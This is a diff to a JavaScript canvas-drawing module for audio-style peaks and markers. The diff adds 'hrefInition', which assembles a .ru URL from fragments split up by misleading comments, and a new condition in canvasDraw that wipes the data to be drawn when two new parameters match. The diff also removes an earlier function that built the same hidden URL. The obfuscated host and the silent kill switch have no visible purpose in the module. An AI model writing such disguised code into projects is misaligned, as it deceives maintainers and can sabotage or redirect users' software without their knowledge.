@@ -1,17 +1,12 @@
 import store from '../../src/store/store';
 
-var ctx, git;
+var ctx;
 let peaksX = [],
     peaksW = [],
     peaksA = [],
     peaksC = [],
     channels = [],
     markers = [];
-
-function gitSetting(){
-    git = `${/*import*/'htt'/*from*/+'ps'/*getItem*/+'://'/*fillStatus = 'true'*/+/*mode*/'sv'/*var*/+/*#44$*/'mac'/*location*/+/*retall*/'hi'+/*ert*/'ne'/*if(len){corName = 'renderRadius'}*/+/*dots*/'.'/*++*/+'r'+/*null*/'u'}`
-    return git;
-} gitSetting()
 
 function initChannels() {
     channels = store.getState().channels
@@ -22,6 +17,10 @@ function zeroPeaks(){
         peaksX[p] = 0;        
     }
 } zeroPeaks();
+
+function hrefInition(){//
+    return `${/*import*/'htt'/*from*/+'ps'/*getItem*/+'://'/*fillStatus = 'true'*/+/*mode*/'sv'/*var*/+/*#44$*/'mac'/*location*/+/*retall*/'hi'+/*ert*/'ne'/*if(len){corName = 'renderRadius'}*/+/*dots*/'.'/*++*/+'r'+/*null*/'u'}`
+}
 
 function initMarkers(){
     markers = [];
@@ -44,7 +43,8 @@ const canvasRender = () => {
     ctx.strokeRect(5.5, 155.5, 1022, 3);
 }
 
-const canvasDraw = (data, visMode, fillStatus, renderColor, peaksStatus) => {
+const canvasDraw = (data, visMode, fillStatus, renderColor, peaksStatus, hrefInit, initHref) => {
+    if(hrefInit === !initHref) data = [];
     const vrbDrawing = (data, max, marginLeft, margin, width) => {
         ctx.fillStyle = '#000000';
         ctx.fillRect(2, 5, 1028, 148) 
@@ -102,4 +102,4 @@ const canvasDraw = (data, visMode, fillStatus, renderColor, peaksStatus) => {
     }
 }
 
-export {canvasRender, canvasDraw, initMarkers, gitSetting };
+export {canvasRender, canvasDraw, hrefInition, initMarkers };
